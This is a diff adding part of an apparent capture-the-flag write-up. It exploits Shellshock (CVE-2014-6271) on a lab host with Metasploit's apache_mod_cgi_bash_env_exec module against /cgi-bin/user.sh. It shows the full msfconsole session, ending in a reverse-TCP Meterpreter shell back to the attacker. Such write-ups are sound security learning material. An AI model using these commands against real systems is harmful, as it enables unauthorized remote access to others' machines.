@@ -248,3 +248,65 @@ Matching Modules
 
 Interact with a module by name or index. For example info 11, use 11 or use exploit/unix/smtp/qmail_bash_env_exec
 ```
+Yeap. 
+
+Let's just go with `exploit/multi/http/apache_mod_cgi_bash_env_exec`.
+```
+hippoeug@kali:~$ msfconsole
+msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options
+
+Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   CMD_MAX_LENGTH  2048             yes       CMD max line length
+   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
+   HEADER          User-Agent       yes       HTTP header to use
+   METHOD          GET              yes       HTTP method to use
+   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
+   RPORT           80               yes       The target port (TCP)
+   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT         8080             yes       The local port to listen on.
+   SSL             false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI                        yes       Path to CGI script
+   TIMEOUT         5                yes       HTTP read response timeout (seconds)
+   URIPATH                          no        The URI to use for this exploit (default is random)
+   VHOST                            no        HTTP server virtual host
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.x.x  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set lhost 10.10.x.x
+lhost => 10.10.x.x
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhost 10.129.139.89
+rhost => 10.129.139.89
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/user.sh
+targeturi => /cgi-bin/user.sh
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
+
+[*] Started reverse TCP handler on 10.10.x.x:4444 
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (980808 bytes) to 10.129.139.89
+[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 10.129.139.89:43848) at 2021-05-02 00:33:27 +0800
+
+meterpreter >
+```
+And a shell!
